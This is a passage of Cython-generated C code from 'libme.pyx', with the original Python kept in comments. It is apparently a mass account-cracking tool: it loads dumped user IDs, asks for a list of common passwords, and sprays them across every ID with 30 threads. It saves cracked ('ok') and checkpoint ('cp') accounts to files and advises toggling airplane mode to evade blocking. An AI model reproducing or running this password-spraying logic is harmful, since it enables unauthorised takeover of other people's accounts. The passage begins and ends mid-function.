 * 		ask = input("  [!] Password Method [y/t] : ")
 * 		if ask == "y":
 */
      if (unlikely(!__pyx_v_file)) { __Pyx_RaiseUnboundLocalError("file"); __PYX_ERR(0, 896, __pyx_L5_except_error) }
      __pyx_t_9 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Please_Dump_File_first_s_not_fo, __pyx_v_file); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 896, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 896, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":891
 * 		print("  [] Extra Dump Files saved in > %s"%(___file))
 * 	def __100__00__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			file = '/storage/emulated/0/10_0.txt'
 * 			for line in open(file, 'r').readlines():
 */
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":897
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Please Dump File first %s not found"%(file))
 * 		ask = input("  [!] Password Method [y/t] : ")             # <<<<<<<<<<<<<<
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
  __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__51, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 897, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_v_ask = __pyx_t_4;
  __pyx_t_4 = 0;

  /* "libme.pyx":898
 * 			exit("\n [!] Please Dump File first %s not found"%(file))
 * 		ask = input("  [!] Password Method [y/t] : ")
 * 		if ask == "y":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 */
  __pyx_t_13 = (__Pyx_PyString_Equals(__pyx_v_ask, __pyx_n_s_y, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 898, __pyx_L1_error)
  if (__pyx_t_13) {

    /* "libme.pyx":899
 * 		ask = input("  [!] Password Method [y/t] : ")
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter Password : ")
 */
    /*with:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 899, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 899, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 899, __pyx_L1_error)
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_empty_tuple, __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 899, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 899, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_4 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 899, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_6 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 899, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __pyx_t_6;
      __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      /*try:*/ {
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_2, &__pyx_t_1, &__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_2);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_14);
          /*try:*/ {
            __pyx_v_coeg = __pyx_t_4;
            __pyx_t_4 = 0;

            /* "libme.pyx":900
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")             # <<<<<<<<<<<<<<
 * 				listpass = input("  [+] Enter Password : ")
 * 				if len(listpass)<=5:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_For_Example_Separators_44) < 0) __PYX_ERR(0, 900, __pyx_L18_error)

            /* "libme.pyx":901
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter Password : ")             # <<<<<<<<<<<<<<
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")
 */
            __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__54, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 901, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_v_listpass = __pyx_t_4;
            __pyx_t_4 = 0;

            /* "libme.pyx":902
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter Password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
            __pyx_t_7 = PyObject_Length(__pyx_v_listpass); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 902, __pyx_L18_error)
            __pyx_t_13 = ((__pyx_t_7 <= 5) != 0);
            if (__pyx_t_13) {

              /* "libme.pyx":903
 * 				listpass = input("  [+] Enter Password : ")
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")             # <<<<<<<<<<<<<<
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
              __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__11, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 903, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

              /* "libme.pyx":902
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter Password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
            }

            /* "libme.pyx":904
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 */
            __pyx_t_4 = __Pyx_PyString_FormatSafe(__pyx_kp_s_0_97m_Crack_with_password_0_91m, __pyx_v_listpass); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 904, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_4);
            if (__Pyx_PrintOne(0, __pyx_t_4) < 0) __PYX_ERR(0, 904, __pyx_L18_error)
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "libme.pyx":905
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 905, __pyx_L18_error)

            /* "libme.pyx":906
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 906, __pyx_L18_error)

            /* "libme.pyx":907
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")             # <<<<<<<<<<<<<<
 * 				for user in self.id:
 * 					uid, name = user.split("|")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_If_No_Result_Turn_On_Airplane_M) < 0) __PYX_ERR(0, 907, __pyx_L18_error)

            /* "libme.pyx":908
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 */
            __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 908, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_4);
            if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
              __pyx_t_5 = __pyx_t_4; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
              __pyx_t_8 = NULL;
            } else {
              __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 908, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 908, __pyx_L18_error)
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            for (;;) {
              if (likely(!__pyx_t_8)) {
                if (likely(PyList_CheckExact(__pyx_t_5))) {
                  if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_4 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 908, __pyx_L18_error)
                  #else
                  __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 908, __pyx_L18_error)
                  __Pyx_GOTREF(__pyx_t_4);
                  #endif
                } else {
                  if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 908, __pyx_L18_error)
                  #else
                  __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 908, __pyx_L18_error)
                  __Pyx_GOTREF(__pyx_t_4);
                  #endif
                }
              } else {
                __pyx_t_4 = __pyx_t_8(__pyx_t_5);
                if (unlikely(!__pyx_t_4)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 908, __pyx_L18_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_4);
              }
              __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_4);
              __pyx_t_4 = 0;

              /* "libme.pyx":909
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:
 * 					uid, name = user.split("|")             # <<<<<<<<<<<<<<
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 * 		elif ask == "t":
 */
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 909, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_10 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_6);
                if (likely(__pyx_t_10)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                  __Pyx_INCREF(__pyx_t_10);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_6, function);
                }
              }
              __pyx_t_4 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_10, __pyx_kp_s__38) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_s__38);
              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 909, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              if ((likely(PyTuple_CheckExact(__pyx_t_4))) || (PyList_CheckExact(__pyx_t_4))) {
                PyObject* sequence = __pyx_t_4;
                Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                if (unlikely(size != 2)) {
                  if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                  else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                  __PYX_ERR(0, 909, __pyx_L18_error)
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                if (likely(PyTuple_CheckExact(sequence))) {
                  __pyx_t_6 = PyTuple_GET_ITEM(sequence, 0); 
                  __pyx_t_10 = PyTuple_GET_ITEM(sequence, 1); 
                } else {
                  __pyx_t_6 = PyList_GET_ITEM(sequence, 0); 
                  __pyx_t_10 = PyList_GET_ITEM(sequence, 1); 
                }
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_10);
                #else
                __pyx_t_6 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 909, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_10 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 909, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_10);
                #endif
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              } else {
                Py_ssize_t index = -1;
                __pyx_t_9 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 909, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __pyx_t_15 = Py_TYPE(__pyx_t_9)->tp_iternext;
                index = 0; __pyx_t_6 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_6)) goto __pyx_L27_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_6);
                index = 1; __pyx_t_10 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_10)) goto __pyx_L27_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_10);
                if (__Pyx_IternextUnpackEndCheck(__pyx_t_15(__pyx_t_9), 2) < 0) __PYX_ERR(0, 909, __pyx_L18_error)
                __pyx_t_15 = NULL;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                goto __pyx_L28_unpacking_done;
                __pyx_L27_unpacking_failed:;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_15 = NULL;
                if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                __PYX_ERR(0, 909, __pyx_L18_error)
                __pyx_L28_unpacking_done:;
              }
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_6);
              __pyx_t_6 = 0;
              __Pyx_XDECREF_SET(__pyx_v_name, __pyx_t_10);
              __pyx_t_10 = 0;

              /* "libme.pyx":910
 * 				for user in self.id:
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))             # <<<<<<<<<<<<<<
 * 		elif ask == "t":
 * 				with ThreadPoolExecutor(max_workers=30) as coeg:
 */
              __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 910, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_f_james); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 910, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_v_listpass, __pyx_n_s_split); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 910, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_16);
              __pyx_t_17 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_16);
                if (likely(__pyx_t_17)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
                  __Pyx_INCREF(__pyx_t_17);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_16, function);
                }
              }
              __pyx_t_9 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_16, __pyx_t_17, __pyx_kp_s__12) : __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_kp_s__12);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 910, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_9);
              __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
              __pyx_t_16 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
                __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_10);
                if (likely(__pyx_t_16)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                  __Pyx_INCREF(__pyx_t_16);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_10, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_10)) {
                PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_t_6, __pyx_v_uid, __pyx_t_9};
                __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 910, __pyx_L18_error)
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_10)) {
                PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_t_6, __pyx_v_uid, __pyx_t_9};
                __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 910, __pyx_L18_error)
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              } else
              #endif
              {
                __pyx_t_17 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 910, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_17);
                if (__pyx_t_16) {
                  __Pyx_GIVEREF(__pyx_t_16); PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_t_16); __pyx_t_16 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_6);
                PyTuple_SET_ITEM(__pyx_t_17, 0+__pyx_t_12, __pyx_t_6);
                __Pyx_INCREF(__pyx_v_uid);
                __Pyx_GIVEREF(__pyx_v_uid);
                PyTuple_SET_ITEM(__pyx_t_17, 1+__pyx_t_12, __pyx_v_uid);
                __Pyx_GIVEREF(__pyx_t_9);
                PyTuple_SET_ITEM(__pyx_t_17, 2+__pyx_t_12, __pyx_t_9);
                __pyx_t_6 = 0;
                __pyx_t_9 = 0;
                __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_t_17, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 910, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              }
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

              /* "libme.pyx":908
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 */
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":899
 * 		ask = input("  [!] Password Method [y/t] : ")
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter Password : ")
 */
          }
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          goto __pyx_L23_try_end;
          __pyx_L18_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          /*except:*/ {
            __Pyx_AddTraceback("libme.James.__100__00__", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_4, &__pyx_t_10) < 0) __PYX_ERR(0, 899, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_17 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_4, __pyx_t_10); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 899, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_17, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 899, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_13 = __Pyx_PyObject_IsTrue(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (__pyx_t_13 < 0) __PYX_ERR(0, 899, __pyx_L20_except_error)
            __pyx_t_19 = ((!(__pyx_t_13 != 0)) != 0);
            if (__pyx_t_19) {
              __Pyx_GIVEREF(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_4);
              __Pyx_XGIVEREF(__pyx_t_10);
              __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_4, __pyx_t_10);
              __pyx_t_5 = 0; __pyx_t_4 = 0; __pyx_t_10 = 0; 
              __PYX_ERR(0, 899, __pyx_L20_except_error)
            }
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            goto __pyx_L19_exception_handled;
          }
          __pyx_L20_except_error:;
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_1, __pyx_t_14);
          goto __pyx_L1_error;
          __pyx_L19_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_1, __pyx_t_14);
          __pyx_L23_try_end:;
        }
      }
      /*finally:*/ {
        /*normal exit:*/{
          if (__pyx_t_3) {
            __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__13, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 899, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          }
          goto __pyx_L17;
        }
        __pyx_L17:;
      }
      goto __pyx_L32;
      __pyx_L14_error:;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L1_error;
      __pyx_L32:;
    }

    /* "libme.pyx":898
 * 			exit("\n [!] Please Dump File first %s not found"%(file))
 * 		ask = input("  [!] Password Method [y/t] : ")
 * 		if ask == "y":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 */
    goto __pyx_L13;
  }

  /* "libme.pyx":911
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 * 		elif ask == "t":             # <<<<<<<<<<<<<<
 * 				with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  __pyx_t_19 = (__Pyx_PyString_Equals(__pyx_v_ask, __pyx_n_s_t, Py_EQ)); if (unlikely(__pyx_t_19 < 0)) __PYX_ERR(0, 911, __pyx_L1_error)
  if (__pyx_t_19) {

    /* "libme.pyx":912
